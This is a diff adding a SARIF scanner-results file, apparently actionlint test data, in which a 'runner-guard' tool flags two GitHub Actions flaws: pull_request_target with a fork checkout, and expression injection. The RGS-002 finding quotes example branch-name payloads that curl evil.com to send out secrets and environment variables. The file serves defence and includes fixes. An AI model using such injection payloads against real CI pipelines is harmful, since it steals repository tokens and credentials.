@@ -1,0 +1,107 @@
+{
+  "$schema": "https://docs.oasis-open.org/sarif/sarif/v2.1.0/errata01/os/schemas/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "runner-guard",
+          "version": "0.1.0",
+          "informationUri": "https://github.com/Vigilant-LLC/runner-guard",
+          "rules": [
+            {
+              "id": "RGS-001",
+              "name": "pull_request_target with Fork Code Checkout",
+              "shortDescription": {
+                "text": "pull_request_target with Fork Code Checkout"
+              },
+              "fullDescription": {
+                "text": "A workflow uses the `pull_request_target` trigger and checks out the pull request head ref (fork code) using `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` or `ref: ${{ github.event.pull_request.head.ref }}` or similar PR-head references. The `pull_request_target` event runs in the context of the base repository with access to secrets, write tokens, and all repository permissions. When combined with a checkout of fork-submitted code, any malicious code in the PR (modified build scripts, Makefiles, package.json scripts, pre/post-install hooks, or workflow files themselves) executes with full privileges of the target repository. This is the single most dangerous pattern in GitHub Actions and has led to multiple real-world supply-chain compromises.\n"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "critical"
+                ]
+              }
+            },
+            {
+              "id": "RGS-002",
+              "name": "Expression Injection via Branch Name or Untrusted Input",
+              "shortDescription": {
+                "text": "Expression Injection via Branch Name or Untrusted Input"
+              },
+              "fullDescription": {
+                "text": "A `run:` block in a GitHub Actions workflow contains a `${{ }}` expression that directly interpolates a Tier-1 untrusted input source. Tier-1 sources include: `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.issue.title`, `github.event.issue.body`, `github.event.comment.body`, `github.event.review.body`, `github.event.discussion.title`, `github.event.discussion.body`, `github.head_ref`, `github.event.pull_request.head.ref`, `github.event.pull_request.head.label`, and `github.event.workflow_run.head_branch`. These values are fully controlled by external users and are injected directly into the shell script before execution, enabling arbitrary command injection. GitHub Actions expression interpolation happens before the shell ever sees the script, meaning no amount of shell quoting in the workflow file can prevent injection -- the attacker's payload becomes part of the script source code itself.\n"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "critical"
+                ]
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "RGS-001",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "pull_request_target with Fork Code Checkout: A workflow uses the `pull_request_target` trigger and checks out the pull request head ref (fork code) using `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` or `ref: ${{ github.event.pull_request.head.ref }}` or similar PR-head references. The `pull_request_target` event runs in the context of the base repository with access to secrets, write tokens, and all repository permissions. When combined with a checkout of fork-submitted code, any malicious code in the PR (modified build scripts, Makefiles, package.json scripts, pre/post-install hooks, or workflow files themselves) executes with full privileges of the target repository. This is the single most dangerous pattern in GitHub Actions and has led to multiple real-world supply-chain compromises.\n | Attack: An attacker forks a popular open-source repository and submits a pull request. The PR contains a modified build script, Makefile, or test configuration that includes a reverse shell, secret exfiltration curl command, or supply-chain payload. Because the target repository's workflow uses `pull_request_target` and then checks out the attacker's fork code via `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`, the malicious code runs with the base repository's GITHUB_TOKEN (which has write access to the repository) and any configured secrets (NPM tokens, PyPI tokens, cloud credentials). The attacker can exfiltrate secrets to an external server, push malicious commits to the main branch, create new releases with backdoored artifacts, modify GitHub Pages, or pivot to connected CI/CD infrastructure. In documented incidents, attackers exploited exactly this pattern to steal GitHub Personal Access Tokens from high-profile open-source projects, then used those tokens to push malicious code directly to main branches.\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "C:\\Users\\kjanat\\Projects\\actionlint\\.worktrees\\go-v2\\examples\\plugins\\external-linters\\testdata\\runner-guard\\.github\\workflows\\captured.yml"
+                },
+                "region": {
+                  "startLine": 9
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "critical",
+            "evidence": "actions/checkout with ref: ${{ github.event.pull_request.head.sha }}",
+            "fix": "**Option 1 (Preferred): Use `pull_request` trigger instead.**\n\nThe `pull_request` trigger runs in the context of the fork with read-only permissions\nand no access to repository secrets. This is safe for building and testing PR code.\n\n```yaml\n# SAFE: pull_request runs in fork context with limited permissions\non:\n  pull_request:\n    branches: [main]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4  # Checks out the PR merge commit safely\n      - run: npm test\n```\n\n**Option 2: If `pull_request_target` is required, never checkout fork code.**\n\nSome workflows legitimately need `pull_request_target` (e.g., to label PRs, post\ncomments). In these cases, never checkout or execute the PR's code:\n\n```yaml\non:\n  pull_request_target:\n    branches: [main]\n\njobs:\n  label:\n    runs-on: ubuntu-latest\n    steps:\n      # SAFE: Does not checkout fork code, only uses GitHub API\n      - uses: actions/labeler@v5\n        with:\n          repo-token: ${{ secrets.GITHUB_TOKEN }}\n```\n\n**Option 3: Two-workflow approach for trusted operations on PR code.**\n\nIf you must run privileged operations after validating PR code, use a two-workflow\nsplit: one unprivileged workflow that builds/tests the PR code and uploads artifacts,\nand a second `workflow_run` triggered workflow that downloads and deploys artifacts\nwithout checking out fork code.\n\n```yaml\n# Workflow 1: Unprivileged build (runs in fork context)\nname: Build PR\non:\n  pull_request:\n    branches: [main]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci && npm run build\n      - uses: actions/upload-artifact@v4\n        with:\n          name: build-output\n          path: dist/\n\n# Workflow 2: Privileged deploy (runs in base context, never checks out fork code)\nname: Deploy Preview\non:\n  workflow_run:\n    workflows: [\"Build PR\"]\n    types: [completed]\njobs:\n  deploy:\n    if: github.event.workflow_run.conclusion == 'success'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/download-artifact@v4\n        with:\n          run-id: ${{ github.event.workflow_run.id }}\n      # Deploy artifact WITHOUT checking out any fork code\n```\n"
+          }
+        },
+        {
+          "ruleId": "RGS-002",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "Expression Injection via Branch Name or Untrusted Input: A `run:` block in a GitHub Actions workflow contains a `${{ }}` expression that directly interpolates a Tier-1 untrusted input source. Tier-1 sources include: `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.issue.title`, `github.event.issue.body`, `github.event.comment.body`, `github.event.review.body`, `github.event.discussion.title`, `github.event.discussion.body`, `github.head_ref`, `github.event.pull_request.head.ref`, `github.event.pull_request.head.label`, and `github.event.workflow_run.head_branch`. These values are fully controlled by external users and are injected directly into the shell script before execution, enabling arbitrary command injection. GitHub Actions expression interpolation happens before the shell ever sees the script, meaning no amount of shell quoting in the workflow file can prevent injection -- the attacker's payload becomes part of the script source code itself.\n | Attack: An attacker creates a branch with a name containing a shell metacharacter payload, such as `feature/$(curl -s https://evil.com/exfil?token=$(cat /run/secrets/*))` or `test\"; curl https://evil.com/pwn -d @<(env); echo \"`. When a pull request is opened from this branch, the workflow interpolates `${{ github.head_ref }}` directly into a `run:` block. Because expression interpolation happens at the template level before bash execution, the attacker's payload is spliced directly into the shell script and executes with full runner privileges. The attacker can exfiltrate environment variables (which contain GITHUB_TOKEN and any configured secrets passed via env), install backdoors, modify repository contents, or pivot to connected infrastructure. The same attack applies to PR titles, issue bodies, comment bodies, and any other Tier-1 source that an external contributor controls.\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "C:\\Users\\kjanat\\Projects\\actionlint\\.worktrees\\go-v2\\examples\\plugins\\external-linters\\testdata\\runner-guard\\.github\\workflows\\captured.yml"
+                },
+                "region": {
+                  "startLine": 12
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "critical",
+            "evidence": "Tainted expression in run block: ${{ github.event.pull_request.title }}",
+            "fix": "**Never interpolate `${{ }}` expressions directly in `run:` blocks.** Instead,\npass untrusted values through environment variables, which are properly escaped\nby the shell.\n\n**Vulnerable pattern:**\n\n```yaml\n# DANGEROUS: Direct interpolation -- attacker controls the shell script\n- run: |\n    echo \"Building branch ${{ github.head_ref }}\"\n    echo \"PR title: ${{ github.event.pull_request.title }}\"\n```\n\n**Safe pattern using environment variables:**\n\n```yaml\n# SAFE: Values are passed as environment variables, properly escaped by the shell\n- run: |\n    echo \"Building branch ${BRANCH_NAME}\"\n    echo \"PR title: ${PR_TITLE}\"\n  env:\n    BRANCH_NAME: ${{ github.head_ref }}\n    PR_TITLE: ${{ github.event.pull_request.title }}\n```\n\n**Why this works:** When you use `${{ }}` in the `env:` mapping, the value is\nassigned to an environment variable. When the shell script references `${BRANCH_NAME}`,\nthe shell treats it as a data value, not as executable code. Shell metacharacters\nin the value are not interpreted as shell syntax.\n\n**Complete list of Tier-1 sources to never interpolate directly:**\n\n```\ngithub.head_ref\ngithub.event.pull_request.title\ngithub.event.pull_request.body\ngithub.event.pull_request.head.ref\ngithub.event.pull_request.head.label\ngithub.event.issue.title\ngithub.event.issue.body\ngithub.event.comment.body\ngithub.event.review.body\ngithub.event.discussion.title\ngithub.event.discussion.body\ngithub.event.pages.*.page_name\ngithub.event.commits.*.message\ngithub.event.commits.*.author.email\ngithub.event.commits.*.author.name\ngithub.event.workflow_run.head_branch\n```\n\n**For `if:` conditions**, use explicit comparison rather than interpolation:\n\n```yaml\n# SAFE in if: conditions (evaluated as expression, not shell)\nif: github.event.comment.body == '/deploy'\n```\n"
+          }
+        }
+      ]
+    }
+  ]
+}
